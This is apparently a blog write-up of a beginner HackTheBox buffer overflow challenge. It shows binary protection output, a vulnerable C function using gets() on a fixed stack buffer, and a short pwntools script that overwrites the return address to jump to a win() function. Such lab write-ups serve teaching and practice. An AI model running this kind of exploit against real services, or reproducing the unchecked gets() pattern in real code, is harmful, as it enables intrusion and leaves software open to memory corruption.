---
title: "HackTheBox - Buffer Overflow 101"
date: 2026-11-08
categories: [CTF Writeups]
tags: [pwn, bof, hackthebox]
---

## Challenge Overview

This is a beginner-friendly buffer overflow challenge from HackTheBox.

- **Difficulty:** Easy
- **Points:** 100
- **Category:** Pwn

## Recon

First, let's check the binary protections:

```bash
checksec ./vuln
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

No stack canary and no PIE — classic stack buffer overflow setup.

## Exploitation

The vulnerable function uses `gets()` without bounds checking:

```c
void vulnerable() {
    char buf[64];
    gets(buf);
}
```

We can overwrite the return address to redirect execution to the `win()` function.

```python
from pwn import *

p = remote('challenge.htb', 1337)
payload = b'A' * 72 + p64(0x401234)
p.sendline(payload)
p.interactive()
```

## Flag

```
HTB{example_flag_buffer_overflow}
```
